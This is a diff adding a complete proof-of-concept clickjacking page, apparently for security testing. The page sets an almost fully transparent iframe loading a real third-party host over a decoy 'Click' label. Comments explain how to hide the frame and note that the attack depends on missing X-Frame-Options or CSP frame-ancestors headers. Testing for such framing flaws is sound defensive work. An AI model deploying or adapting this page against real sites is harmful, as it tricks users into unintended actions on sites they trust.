@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+<!--  this opacity must be smaller than 0 or  0 if it works e.g; 0.001, and z-index user for layers .. it must be on top of #targetFrame e.g; 2, -->
+  <title>Malicious Page For Clickjacking</title>
+<style>
+  #div
+  {
+      position: absolute;
+      top: 115px;
+      left: 80px;
+      z-index: 1;
+      font-size: 30;
+  }
+  #iframe {
+      position: absolute;
+      width: 400px;
+      height: 400px;
+      top: 50px;
+      left: 50px;
+      opacity: 0.0001;
+      z-index: 2;
+    }
+  </style>
+</head>
+
+<body>
+  <div id=div><b>Click</b></div>
+  <iframe id="iframe" src="http://rdns2.hostgator.in"></iframe>
+</body>
+</html>
+
+<!-- #iframe  opacity must be 0.001 or 0 if supported to hide the iframe page completely
+opacity: 0.1; opacity is better option for debugging
+-->
+
+<!--if headers missing X-FRAME-OPTIONS OR FRAME-ANCESTORS (CSP) Content Security Policy -->
